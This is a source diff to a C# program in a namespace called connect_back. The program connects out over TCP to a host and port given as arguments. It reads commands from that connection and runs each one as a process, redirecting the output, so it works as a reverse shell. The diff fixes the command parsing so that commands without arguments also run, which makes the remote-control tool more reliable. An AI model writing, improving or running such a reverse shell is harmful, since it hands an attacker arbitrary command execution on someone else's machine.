@@ -12,14 +12,21 @@ namespace connect_back
 		{
 			Stream stream = new TcpClient (args [0], int.Parse (args [1])).GetStream ();
 			using (StreamReader rdr = new StreamReader(stream)) {
-				while (stream.CanRead) {
-					string command = rdr.ReadLine();
-					string fileName = command.Substring(0, command.IndexOf(' '));
-					string arg = command.Substring(command.IndexOf(' '), command.Length - fileName.Length);
+				while (stream.CanRead) {				
+					string cmd = rdr.ReadLine();
+					string filename = string.Empty;
+					string arg = string.Empty;
+
+					if (cmd.IndexOf(' ') > 0) { 
+						filename = cmd.Substring(0, cmd.IndexOf(' '));
+						arg = cmd.Substring(cmd.IndexOf(' '), cmd.Length - filename.Length);
+					} else {
+						filename = cmd;
+					}
 
 					Process prc = new Process();
 					prc.StartInfo = new ProcessStartInfo();
-					prc.StartInfo.FileName = fileName;
+					prc.StartInfo.FileName = filename;
 					prc.StartInfo.Arguments = arg;
 					prc.StartInfo.UseShellExecute = false;
 					prc.StartInfo.RedirectStandardOutput = true;
